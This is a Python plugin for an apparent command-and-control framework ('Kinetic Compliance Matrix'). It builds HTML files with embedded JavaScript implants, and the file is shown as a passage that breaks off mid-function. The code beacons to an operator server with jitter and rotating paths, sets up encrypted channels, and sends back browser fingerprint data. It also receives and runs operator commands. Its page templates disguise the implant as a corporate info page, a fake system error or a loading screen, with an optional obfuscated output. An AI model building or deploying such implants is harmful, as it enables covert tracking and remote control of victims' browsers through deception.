import os
import base64
import json
import datetime
import random
import string
import time

from plugins.base_agent_plugin import BaseAgentPlugin


class HTMLAgentPlugin(BaseAgentPlugin):
    """HTML-based agent plugin that creates an HTML file for browser execution"""
    
    @classmethod
    def get_name(cls) -> str:
        """Return the name of this agent type for UI display"""
        return "HTML"
    
    @classmethod
    def get_description(cls) -> str:
        """Return a description of this agent type"""
        return "An HTML file-based agent that runs in web browsers with JavaScript. Double-clickable and does not require special permissions."
    
    @classmethod
    def get_options(cls) -> dict:
        """Return configuration options for HTML agent"""
        return {
            "beacon_period": {
                "type": "int",
                "default": 30,
                "description": "Beacon interval in seconds - how often the agent checks in",
                "required": True
            },
            "jitter_percentage": {
                "type": "int",
                "default": 20,
                "description": "Random variation in beacon timing (percentage)",
                "required": True
            },
            "websocket_fallback": {
                "type": "bool",
                "default": False,
                "description": "Use WebSockets as fallback when AJAX fails",
                "required": False
            },
            "user_agent": {
                "type": "string",
                "default": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                "description": "User-Agent string for HTTP requests",
                "required": False
            },
            "page_title": {
                "type": "string",
                "default": "System Information",
                "description": "Title for the HTML page",
                "required": False
            },
            "appearance": {
                "type": "list",
                "default": "corporate",
                "description": "Visual style of the HTML page",
                "required": False,
                "values": ["corporate", "minimal", "error", "loading", "blank"]
            },
            "format": {
                "type": "list",
                "default": "html",
                "description": "Output format for the agent",
                "required": False,
                "values": ["html", "obfuscated"]
            }
        }
    
    @classmethod
    def get_agent_capabilities(cls) -> list:
        """Return capabilities supported by HTML agent"""
        return [
            "system_information", 
            "dynamic_path_rotation", 
            "secure_key_exchange",
            "command_execution",
            "browser_based"
        ]
    
    @classmethod
    def get_supported_platforms(cls) -> list:
        """Return platforms supported by HTML agent"""
        return ["windows", "linux", "macos", "android", "ios"]  # Any platform with a browser
    
    @classmethod
    def get_file_extension(cls) -> str:
        """Get the file extension for this agent type"""
        return "html"

    @classmethod
    def get_template_code(cls, config: dict, campaign_settings: dict) -> str:
        """Return the template code for this agent with placeholders"""
        # Get the appropriate HTML template based on appearance
        page_title = config.get("page_title", "System Information")
        appearance = config.get("appearance", "corporate")
        html_template = cls._get_html_template(appearance, page_title)
        
        # Get the JavaScript template
        js_template = cls._get_javascript_template()
        
        # Rather than replacing {AGENT_SCRIPT} with js_template here,
        # return the base template with {{AGENT_SCRIPT}} (double braces)
        # so BaseAgentPlugin can handle it like other placeholders
        return html_template.replace("{AGENT_SCRIPT}", "{{AGENT_SCRIPT}}")
    
    
    @classmethod
    def generate_agent_code(cls, config: dict, campaign_settings: dict) -> str:
        """Generate the HTML agent code with all placeholders filled in"""
        # First get standard agent code with all basic placeholders replaced
        agent_code = super().generate_agent_code(config, campaign_settings)
        
        # Extract configuration values
        beacon_period = config.get("beacon_period", 30)
        jitter_percentage = config.get("jitter_percentage", 20)
        websocket_fallback = config.get("websocket_fallback", False)
        user_agent = config.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
        # Get server address and protocol
        server_address = campaign_settings.get("server_address", "")
        protocol = "https" if campaign_settings.get("ssl_enabled", False) else "http"
        
        # Get path pool and rotation info
        rotation_info = campaign_settings.get("rotation_info", {})
        path_pool = rotation_info.get("current_paths", {}).get("path_pool", [])
        rotation_id = rotation_info.get("current_rotation_id", 0)
        next_rotation_time = rotation_info.get("next_rotation_time", int(time.time()) + 3600)
        rotation_interval = rotation_info.get("rotation_interval", 3600)
        
        # Check if AGENT_SCRIPT needs to be replaced
        if "{{AGENT_SCRIPT}}" in agent_code:
            # Get the JavaScript template
            js_template = cls._get_javascript_template()
            
            # Replace all placeholders in the JavaScript template
            js_template = js_template.replace("{{SERVER_ADDRESS}}", server_address)
            js_template = js_template.replace("{{PROTOCOL}}", protocol)
            js_template = js_template.replace("{{BEACON_PERIOD}}", str(beacon_period))
            js_template = js_template.replace("{{JITTER_PERCENTAGE}}", str(jitter_percentage))
            js_template = js_template.replace("{{USER_AGENT}}", user_agent)
            js_template = js_template.replace("{{WEBSOCKET_FALLBACK}}", str(websocket_fallback).lower())
            js_template = js_template.replace("{{PATH_POOL}}", json.dumps(path_pool))
            js_template = js_template.replace("{{ROTATION_ID}}", str(rotation_id))
            js_template = js_template.replace("{{NEXT_ROTATION_TIME}}", str(next_rotation_time))
            js_template = js_template.replace("{{ROTATION_INTERVAL}}", str(rotation_interval))
            
            # Replace the AGENT_SCRIPT placeholder with the populated JavaScript
            agent_code = agent_code.replace("{{AGENT_SCRIPT}}", js_template)
        
        # Add timestamp and metadata as an HTML comment
        metadata = f"""
    <!-- 
        Kinetic Compliance Matrix - HTML Agent
        Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        Beacon Interval: {beacon_period}s
        Jitter: {jitter_percentage}%
        WebSocket Fallback: {websocket_fallback}
    -->
    """
        
        # Apply obfuscation if requested
        if config.get("format", "html") == "obfuscated":
            return metadata + cls._obfuscate_html(agent_code)
        
        return metadata + agent_code
    
    @classmethod
    def _get_html_template(cls, appearance, page_title):
        """Get the HTML template based on appearance style"""
        if appearance == "corporate":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        header {{
            padding-bottom: 10px;
            margin-bottom: 20px;
            border-bottom: 1px solid #eee;
        }}
        h1 {{
            color: #333;
            margin: 0;
        }}
        .loading {{
            display: block;
            width: 100%;
            text-align: center;
            padding: 20px;
            font-style: italic;
            color: #666;
        }}
        .content {{
            padding: 15px;
        }}
        .hidden {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>{page_title}</h1>
        </header>
        <div class="loading">
            Loading information, please wait...
        </div>
        <div class="content hidden">
            <h2>System Information</h2>
            <div id="systemInfo">
                <p>Gathering system information...</p>
            </div>
            <h2>Status</h2>
            <div id="status">
                <p>Initializing...</p>
            </div>
        </div>
    </div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        elif appearance == "minimal":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
    <style>
        body {{
            font-family: sans-serif;
            margin: 0;
            padding: 10px;
        }}
    </style>
</head>
<body>
    <h3>{page_title}</h3>
    <div id="content">Loading...</div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        elif appearance == "error":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error - {page_title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f8f8f8;
        }}
        .error-container {{
            max-width: 600px;
            margin: 50px auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            border-left: 5px solid #cc0000;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #cc0000;
            margin-top: 0;
        }}
        .error-code {{
            color: #888;
            font-family: monospace;
            margin: 20px 0;
            padding: 10px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 3px;
        }}
        .hidden {{
            display: none;
        }}
    </style>
</head>
<body>
    <div class="error-container">
        <h1>An error has occurred</h1>
        <p>The application has encountered an unexpected error and cannot continue.</p>
        <div class="error-code">
            Error Code: 0x80072EE7<br>
            Process ID: 4328<br>
            Session ID: UZVWX4827
        </div>
        <p>Please contact your system administrator for assistance.</p>
    </div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        elif appearance == "loading":
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f8f8f8;
        }}
        .loader {{
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .loading-container {{
            text-align: center;
        }}
        .loading-text {{
            margin-top: 20px;
            color: #666;
        }}
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="loader"></div>
        <div class="loading-text">Loading {page_title}...</div>
    </div>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
        else:  # blank
            return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{page_title}</title>
</head>
<body>
    <script>
        {{AGENT_SCRIPT}}
    </script>
</body>
</html>"""
    
    @classmethod
    def _get_javascript_template(cls):
        """Get the JavaScript template for agent functionality"""
        # Using a raw string to avoid escape sequence issues with JavaScript
        return r"""
// KCM HTML Agent Communication Library
// This provides standardized communication with the C2 server

class KCMAgentCommunication {
    constructor(config) {
        // Create a persistent client ID that doesn't change between beacons
        this.persistentClientId = 'client_' + Math.random().toString(36).substring(2, 10);
        this.persistentHostname = "Browser-" + Math.random().toString(36).substring(2, 10);
        this.persistentMachineGuid = 'browser-' + 
        ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
            (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
        );
        
        // Configuration
        this.config = {
            serverAddress: config.serverAddress || '{{SERVER_ADDRESS}}',
            protocol: config.protocol || '{{PROTOCOL}}',
            beaconInterval: config.beaconInterval || {{BEACON_PERIOD}},
            jitterPercentage: config.jitterPercentage || {{JITTER_PERCENTAGE}},
            userAgent: config.userAgent || '{{USER_AGENT}}',
            onCommandReceived: config.onCommandReceived || this.defaultCommandHandler,
            onConnectionStatus: config.onConnectionStatus || (() => {}),
            websocketFallback: config.websocketFallback || false
        };
        
        // Communication state
        this.state = {
            clientId: null, // Start with null, will be populated by server
            firstContact: true,
            serverPublicKey: null,
            encryptionKey: null,
            keyRegistered: false,
            pathPool: {{PATH_POOL}},
            currentRotationId: {{ROTATION_ID}},
            nextRotationTime: {{NEXT_ROTATION_TIME}},
            rotationInterval: {{ROTATION_INTERVAL}},
            lastBeaconTime: 0,
            consecutiveFailures: 0,
            commands: []
        };
        
        this.crypto = new KCMCrypto();
        
        // Update UI if available
        this.updateUIStatus = function(message) {
            try {
                const statusElement = document.getElementById('status');
                if (statusElement) {
                    statusElement.innerHTML = `<p>${message}</p>`;
                }
            } catch (e) {
                // Silent fail - UI might not be available
            }
        };
        
        this.updateSystemInfo = function(info) {
            try {
                const sysInfoElement = document.getElementById('systemInfo');
                if (sysInfoElement) {
                    let html = '<ul>';
                    for (const [key, value] of Object.entries(info)) {
                        if (typeof value !== 'object') {
                            html += `<li><strong>${key}:</strong> ${value}</li>`;
                        }
                    }
                    html += '</ul>';
                    sysInfoElement.innerHTML = html;
                    
                    // Show content, hide loading
                    document.querySelector('.loading')?.classList.add('hidden');
                    document.querySelector('.content')?.classList.remove('hidden');
                }
            } catch (e) {
                // Silent fail - UI might not be available
            }
        };
    }
    
    // Start the agent's communication loop
    async start() {
        try {
            // Initialize encryption if needed
            await this.crypto.initialize();
            
            this.updateUIStatus("Initializing secure channel...");
            
            // Start the main loop
            this.startAgentLoop();
            
            return true;
        } catch (error) {
            console.error('Error starting agent:', error);
            this.updateUIStatus("Error starting agent: " + error.message);
            return false;
        }
    }
    
    // Main agent loop
    async startAgentLoop() {
        try {
            // Get system information
            const systemInfo = this.getSystemInformation();
            
            // If UI available, update it
            this.updateSystemInfo(systemInfo);
            
            // Add jitter to beacon interval
            const jitterFactor = 1 + ((Math.random() * 2 - 1) * this.config.jitterPercentage / 100);
            const actualInterval = this.config.beaconInterval * jitterFactor * 1000; // Convert to milliseconds
            
            // If this is first contact, use special beacon
            if (this.state.firstContact) {
                this.updateUIStatus("Establishing first contact...");
                const firstContactSuccess = await this.sendFirstContactBeacon();
                
                // Only set firstContact to false if we've registered a key successfully
                if (this.state.keyRegistered) {
                    this.state.firstContact = false;
                    console.log("First contact successful, switching to regular beacons");
                } else {
                    console.log("Key not yet registered, will retry first contact");
                }
            } else {
                // Regular beacon for established connection
                this.updateUIStatus("Sending regular beacon...");
                await this.sendBeacon(systemInfo);
            }
            
            // Update last beacon time
            this.state.lastBeaconTime = Date.now();
            
            // Reset failure counter on success
            this.state.consecutiveFailures = 0;
            
            // Schedule next beacon
            setTimeout(() => this.startAgentLoop(), actualInterval);
            
            // Update connection status
            this.config.onConnectionStatus({ connected: true, failureCount: 0 });
            this.updateUIStatus(`Connected. Next beacon in ${Math.round(actualInterval/1000)}s`);
        } catch (error) {
            console.error('Error in agent loop:', error);
            
            // Increment failure counter
            this.state.consecutiveFailures++;
            
            // Update connection status
            this.config.onConnectionStatus({ 
                connected: false, 
                failureCount: this.state.consecutiveFailures 
            });
            
            // Schedule retry after exponential backoff
            const backoffTime = Math.min(30, Math.pow(2, this.state.consecutiveFailures)) * 1000;
            this.updateUIStatus(`Connection failed. Retry in ${Math.round(backoffTime/1000)}s`);
            setTimeout(() => this.startAgentLoop(), backoffTime);
        }
    }
    
    // First contact beacon - special format for key exchange
    async sendFirstContactBeacon() {
        console.log('Sending first contact beacon');
        this.updateUIStatus("Establishing first contact...");
        
        // Use minimal info matching PowerShell exactly
        const minimalInfo = this.getSystemInformation(true);
        
        // Format exactly as PowerShell agent does
        const operationPayload = {
            "op_type": "beacon",
            "payload": JSON.stringify(minimalInfo)
        };
        
        // Convert to JSON
        const operationJson = JSON.stringify(operationPayload);
        
        // Create the beacon with our persistent ID
        const initialBeacon = {
            d: operationJson,
            t: this.generateRandomToken(50),
            c: this.persistentClientId // Use our persistent ID for first contact
        };
        
        // Use a random path from the pool
        const beaconPath = this.getRandomPath();
        const fullUrl = `${this.config.protocol}://${this.config.serverAddress}${beaconPath}`;
        
        try {
            // Try POST request first
            let response;
            try {
                response = await fetch(fullUrl, {
                    method: 'POST',
                    mode: 'cors',
                    credentials: 'omit', 
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': this.config.userAgent
                    },
                    body: JSON.stringify(initialBeacon)
                });
            } catch (error) {
                // If POST fails with 401, try GET instead (following PowerShell pattern)
                console.log('POST request failed, trying GET fallback');
                
                // Format query string like PowerShell does
                const queryString = `?d=${encodeURIComponent(initialBeacon.d)}&t=${encodeURIComponent(initialBeacon.t)}&i=true&c=${encodeURIComponent(this.persistentClientId)}`;
                
                // Make GET request
                response = await fetch(`${fullUrl}${queryString}`, {
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'omit',
                    headers: {
                        'User-Agent': this.config.userAgent
                    }
                });
            }
            
            if (!response.ok) {
                throw new Error(`HTTP error: ${response.status}`);
            }
            
            // Process the response
            const responseData = await response.json();
            
            // Capture server's assigned client ID
            if (responseData.c) {
                this.state.clientId = responseData.c;
                console.log(`Server assigned client ID: ${this.state.clientId}`);
            }
            
            // Check for server's public key
            if (responseData.pubkey) {
                // Process the server's public key - this will register our key
                await this.processServerPublicKey(responseData.pubkey);
            } else {
                console.error('No public key found in server response!');
                return false;
            }
            
            // Update path rotation info if provided
            if (responseData.r) {
                const rotationInfo = responseData.r;
                if (rotationInfo.cid !== undefined && rotationInfo.nrt !== undefined) {
                    this.state.currentRotationId = rotationInfo.cid;
                    this.state.nextRotationTime = rotationInfo.nrt;
                    console.log(`Updated rotation info - ID: ${rotationInfo.cid}, Next rotation: ${new Date(rotationInfo.nrt * 1000).toLocaleString()}`);
                }
            }
            
            // Handle any commands in the response
            if (responseData.com) {
                let commands = responseData.com;
                
                // Check if commands are encrypted
                if (responseData.e && this.state.encryptionKey) {
                    // Decrypt the commands
                    const decryptedCommands = await this.crypto.decrypt(commands, this.state.encryptionKey);
                    try {
                        commands = JSON.parse(decryptedCommands);
                    } catch (e) {
                        console.error('Error parsing decrypted commands:', e);
                    }
                }
                
                // Process commands
                if (Array.isArray(commands)) {
                    for (const command of commands) {
                        await this.processCommand(command);
                    }
                }
            }
            
            return true;
        }
        catch (error) {
            console.error("First contact beacon failed:", error);
            this.updateUIStatus("Connection failed: " + error.message);
            return false;
        }
    }
    
    
    // Standard beacon for established connections
    async sendBeacon(systemInfo) {
        // Select a random path
        const beaconPath = this.getRandomPath();
        const fullUrl = `${this.config.protocol}://${this.config.serverAddress}${beaconPath}`;
        
        // Create operation payload with the expected op_type field
        const operationPayload = {
            "op_type": "beacon",
            "payload": systemInfo
        };
        
        // Convert to JSON
        const operationJson = JSON.stringify(operationPayload);
        
        // Encrypt the data if we have a key
        const encryptedData = await this.crypto.encrypt(operationJson, this.state.encryptionKey);
        
        // Create the request payload
        const requestPayload = {
            d: encryptedData,
            t: this.generateRandomToken(50 + Math.floor(Math.random() * 450)),
            c: this.state.clientId || this.persistentClientId // Include client ID in all beacons
        };
        
        try {
            // Try POST first
            let response;
            try {
                response = await fetch(fullUrl, {
                    method: 'POST',
                    mode: 'cors',
                    credentials: 'omit',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': this.config.userAgent,
                        'Origin': window.location.origin || 'null'
                    },
                    body: JSON.stringify(requestPayload)
                });
            } catch (error) {
                // If POST fails, try GET as fallback
                console.log('POST beacon failed, trying GET fallback: ', error);
                
                // Format query string like PowerShell does
                const queryString = `?d=${encodeURIComponent(requestPayload.d)}&t=${encodeURIComponent(requestPayload.t)}&c=${encodeURIComponent(requestPayload.c)}`;
                
                response = await fetch(`${fullUrl}${queryString}`, {
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'omit',
                    headers: {
                        'User-Agent': this.config.userAgent
                    }
                });
            }
            
            if (!response.ok) {
                throw new Error(`HTTP error: ${response.status}`);
            }
            
            // Process the response
            const responseData = await response.json();
            
            // Reset consecutive failures on successful response
            this.state.consecutiveFailures = 0;
            
            // Check for path rotation info
            if (responseData.r) {
                const rotationInfo = responseData.r;
                if (rotationInfo.cid !== undefined && rotationInfo.nrt !== undefined) {
                    this.state.currentRotationId = rotationInfo.cid;
                    this.state.nextRotationTime = rotationInfo.nrt;
                    console.log(`Updated rotation info - ID: ${rotationInfo.cid}, Next rotation: ${new Date(rotationInfo.nrt * 1000).toLocaleString()}`);
                }
            }
            
            // Process commands if available
            if (responseData.com) {
                let commands = responseData.com;
                
                // Check if commands are encrypted
                if (responseData.e && this.state.encryptionKey) {
                    // Decrypt the commands
                    const decryptedCommands = await this.crypto.decrypt(commands, this.state.encryptionKey);
                    try {
                        commands = JSON.parse(decryptedCommands);
                    } catch (e) {
                        console.error('Error parsing decrypted commands:', e);
                    }
                }
                
                // Process each command
                if (Array.isArray(commands)) {
                    for (const command of commands) {
                        await this.processCommand(command);
                    }
                }
            }
            
            return true;
        } catch (error) {
            console.error('Error in beacon:', error);
            throw error;
        }
    }
    
    // Process server's public key and initiate key exchange
    async processServerPublicKey(publicKeyBase64) {
        console.log('Processing server public key...');
        this.updateUIStatus("Processing server public key...");
        
        try {
            // Import the server's public key
            const serverPublicKey = await this.crypto.importRSAPublicKey(publicKeyBase64);
            if (!serverPublicKey) {
                console.error('Failed to import server public key');
                this.updateUIStatus("Failed to import server public key");
                return false;
            }
            
            this.state.serverPublicKey = serverPublicKey;
            console.log('Successfully imported server\'s public key');
            
            // Generate a secure client AES key
            this.state.encryptionKey = await this.crypto.generateAESKey();
            if (!this.state.encryptionKey) {
                console.error('Failed to generate client AES key');
                this.updateUIStatus("Failed to generate encryption key");
                return false;
            }
            
            console.log('Generated client AES key');
            this.updateUIStatus("Generated secure encryption key");
            
            // Encrypt the client key with server's public key
            const encryptedKey = await this.crypto.encryptKeyWithRSA(this.state.encryptionKey, this.state.serverPublicKey);
            if (!encryptedKey) {
                console.error('Failed to encrypt client key');
                this.updateUIStatus("Key encryption failed");
                return false;
            }
            
            console.log('Encrypted client key with server\'s public key');
            
            // Use the effective client ID (server-assigned or persistent)
            const effectiveClientId = this.state.clientId || this.persistentClientId;
            
            // Register the key with the server
            const registrationResult = await this.registerClientKey(encryptedKey, effectiveClientId);
            
            if (registrationResult) {
                this.state.keyRegistered = true;
                // Note: We no longer set firstContact to false here, that's handled in startAgentLoop
                console.log('Successfully registered client key with server');
                this.updateUIStatus("Secure communication established");
                return true;
            } else {
                console.error('Failed to register client key with server');
                this.updateUIStatus("Key registration failed");
                return false;
            }
        } catch (error) {
            console.error('Error in processServerPublicKey:', error);
            this.updateUIStatus("Key exchange error: " + error.message);
            return false;
        }
    }
    
    // Register client key with the server
    async registerClientKey(encryptedKey, clientId) {
        try {
            // Use the server-assigned ID if available, otherwise use our persistent ID
            const effectiveClientId = this.state.clientId || this.persistentClientId;
            
            // Create registration request - MATCH THE FORMAT EXPECTED BY THE SERVER
            const registrationData = {
                encrypted_key: encryptedKey,
                client_id: effectiveClientId,
                nonce: this.generateRandomToken(16)  // Random nonce for replay protection
            };
            
            // Convert to JSON
            const registrationJson = JSON.stringify(registrationData);
            
            // THIS IS CRITICAL - Use the dedicated registration endpoint
            const registrationUrl = `${this.config.protocol}://${this.config.serverAddress}/client/service/registration`;
            
            console.log(`Sending key registration to ${registrationUrl} with client ID: ${effectiveClientId}`);
            this.updateUIStatus("Registering secure key...");
            
            // Send the registration request
            let response;
            try {
                response = await fetch(registrationUrl, {
                    method: 'POST',
                    mode: 'cors',
                    credentials: 'omit',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': this.config.userAgent,
                        'Origin': window.location.origin || 'null'
                    },
                    body: registrationJson
                });
            } catch (error) {
                // If the dedicated endpoint fails, try with a random path as fallback
                console.log('Registration endpoint failed, trying with random path: ', error);
                const fallbackPath = this.getRandomPath();
                const fallbackUrl = `${this.config.protocol}://${this.config.serverAddress}${fallbackPath}`;
                
                response = await fetch(fallbackUrl, {
                    method: 'POST',
                    mode: 'cors',
                    credentials: 'omit',
                    headers: {
                        'Content-Type': 'application/json',
                        'User-Agent': this.config.userAgent,
                        'Origin': window.location.origin || 'null'
                    },
                    body: registrationJson
                });
            }
            
            if (!response.ok) {
                throw new Error(`HTTP error: ${response.status}`);
            }
            
            const responseData = await response.json();
            return responseData.status === 'success';
        } catch (error) {
            console.error('Key registration error:', error);
            this.updateUIStatus("Key registration failed: " + error.message);
            return false;
        }
    }
    
    // Process a command from the server
    async processCommand(command) {
        const timestamp = command.timestamp;
        const commandType = command.command_type;
        const args = command.args;
        
        console.log(`Processing command: ${commandType} at ${timestamp}`);
        this.updateUIStatus(`Processing command: ${commandType}`);
        
        let result = '';
        
        try {
            // Handle different command types
            switch (commandType) {
                case 'key_issuance':
                    // Use server key if needed
                    if (!this.state.keyRegistered || !this.state.encryptionKey) {
                        try {
                            this.state.encryptionKey = await this.crypto.importAESKey(args);
                            this.state.keyRegistered = true;
                            this.state.firstContact = false;
                            result = 'Key issuance successful - secure channel established';
                            console.log('Using server-issued key for encryption');
                        } catch (e) {
                            result = `Key issuance failed: ${e.message}`;
                        }
                    } else {
                        result = 'Client using self-generated key, issuance ignored';
                    }
                    break;
                    
                case 'key_rotation':
                    // Only process if key registration failed or is still pending
                    if (!this.state.keyRegistered || !this.state.encryptionKey) {
                        // Handle key rotation command from operator
                        try {
                            this.state.encryptionKey = await this.crypto.importAESKey(args);
                            this.state.keyRegistered = true;
                            result = 'Key rotation successful - using new encryption key';
                        } catch (e) {
                            result = `Key rotation failed: ${e.message}`;
                        }
                    } else {
                        result = 'Client using self-generated key, rotation ignored';
                    }
                    break;
                    
                case 'system_info_request':
                    // Now that we have secure channel, send FULL system info
                    // This matches PowerShell behavior - only sending full info after secure channel
                    const fullSystemInfo = this.getSystemInformation(false);
                    result = JSON.stringify(fullSystemInfo);
                    
                    // Update UI if available
                    this.updateSystemInfo(fullSystemInfo);
                    console.log("Full system information sent after secure channel established");
                    break;
                    
                case 'path_rotation':
                    // Update path rotation information
                    try {
                        const rotationArgs = JSON.parse(args);
                        if (rotationArgs.rotation_id !== undefined) {
                            this.state.currentRotationId = rotationArgs.rotation_id;
                        }
                        if (rotationArgs.next_rotation_time !== undefined) {
                            this.state.nextRotationTime = rotationArgs.next_rotation_time;
                        }
                        if (rotationArgs.paths && rotationArgs.paths.path_pool) {
                            this.state.pathPool = rotationArgs.paths.path_pool;
                        }
                        result = `Path rotation updated: ID ${this.state.currentRotationId}, next rotation at ${new Date(this.state.nextRotationTime * 1000).toLocaleString()}`;
                    } catch (e) {
                        result = `Path rotation failed: ${e.message}`;
                    }
                    break;
                    
                case 'execute':
                    // Execute custom command - pass to handler
                    try {
                        result = await this.config.onCommandReceived(commandType, args);
                        if (result === undefined) {
                            result = 'Command executed successfully (no output)';
                        }
                        if (typeof result !== 'string') {
                            result = JSON.stringify(result);
                        }
                    } catch (e) {
                        result = `Error executing command: ${e.message}`;
                    }
                    break;
                    
                default:
                    result = `Unknown command type: ${commandType}`;
            }
            
            // Send the result back to the server
            await this.sendCommandResult(timestamp, result);
            this.updateUIStatus("Command completed");
        } catch (error) {
            console.error(`Error processing command ${commandType}:`, error);
            // Try to send error back to server
            try {
                await this.sendCommandResult(timestamp, `Error processing command: ${error.message}`);
            } catch (e) {
                console.error('Failed to send error result:', e);
            }
        }
    }
    
    // Send command result back to the server
    async sendCommandResult(timestamp, result) {
        // Select a random path for sending results
        const resultPath = this.getRandomPath();
        const fullUrl = `${this.config.protocol}://${this.config.serverAddress}${resultPath}`;
        
        // Create result object
        const resultObj = {
            timestamp: timestamp,
            result: result
        };
        
        // Create the operation payload
        const operationPayload = {
            op_type: 'result',
            payload: resultObj
        };
        
        // Convert to JSON
        const operationJson = JSON.stringify(operationPayload);
        
        // Encrypt the data
        const encryptedData = await this.crypto.encrypt(operationJson, this.state.encryptionKey);
        
        // Create the request payload
        const requestPayload = {
            d: encryptedData,
            t: this.generateRandomToken(50),
            c: this.state.clientId || this.persistentClientId
        };
        
        console.log(`Sending command result to ${fullUrl}`);
        
        // First try POST
        try {
            const response = await fetch(fullUrl, {
                method: 'POST',
                mode: 'cors', 
                credentials: 'omit',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': this.config.userAgent
                },
                body: JSON.stringify(requestPayload)
            });
            
            if (!response.ok) {
                throw new Error(`HTTP error: ${response.status}`);
            }
            
            console.log('Command result sent successfully via POST');
            return true;
        } catch (error) {
            // If POST fails, try GET as fallback (like PowerShell does)
            console.log('POST result failed, trying GET fallback:', error);
            
            try {
                // Format query string
                const queryString = `?d=${encodeURIComponent(requestPayload.d)}&t=${encodeURIComponent(requestPayload.t)}&c=${encodeURIComponent(requestPayload.c)}`;
                
                const getResponse = await fetch(`${fullUrl}${queryString}`, {
                    method: 'GET',
                    mode: 'cors',
                    credentials: 'omit',
                    headers: {
                        'User-Agent': this.config.userAgent
                    }
                });
                
                if (!getResponse.ok) {
                    throw new Error(`HTTP error: ${getResponse.status}`);
                }
                
                console.log('Command result sent successfully via GET');
                return true;
            } catch (getError) {
                console.error('Error sending command result (both POST and GET failed):', getError);
                return false;
            }
        }
    }
    
    // Utility functions
    
    // Generate random token padding
    generateRandomToken(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    
    // Get a random path from the path pool
    getRandomPath() {
        if (!this.state.pathPool || this.state.pathPool.length === 0) {
            return '/api/endpoint';  // Default fallback path
        }
        return this.state.pathPool[Math.floor(Math.random() * this.state.pathPool.length)];
    }
    
    // Gather system information
    getSystemInformation(minimal = false) {
        // For first contact, return minimal information with exact fields PowerShell uses
        if (minimal) {
            return {
                Hostname: this.persistentHostname,  // Use persistent hostname
                MachineGuid: this.persistentMachineGuid,  // Use persistent machine GUID
                KeyRegistrationStatus: "pending", 
                IP: "127.0.0.1",
                ProxyEnabled: false,
                ProxyType: "system",
                RotationId: 0,
                Username: "Browser-User",
                OsVersion: navigator.userAgent,
                Domain: "WORKGROUP"
            };
        } else {
            // For secure channel, return complete system information
            const info = {
                Hostname: this.persistentHostname,  // Include persistent hostname
                MachineGuid: this.persistentMachineGuid,  // Include persistent machine GUID
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                timeZoneOffset: new Date().getTimezoneOffset(),
                referrer: document.referrer,
                doNotTrack: navigator.doNotTrack,
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                browserVendor: navigator.vendor || 'unknown',
                colorDepth: window.screen.colorDepth,
                devicePixelRatio: window.devicePixelRatio,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
            };
            
            // Try to get battery info if available
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    info.battery = {
                        charging: battery.charging,
                        level: battery.level * 100
                    };
                });
            }
            
            // Get WebGL information if available
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
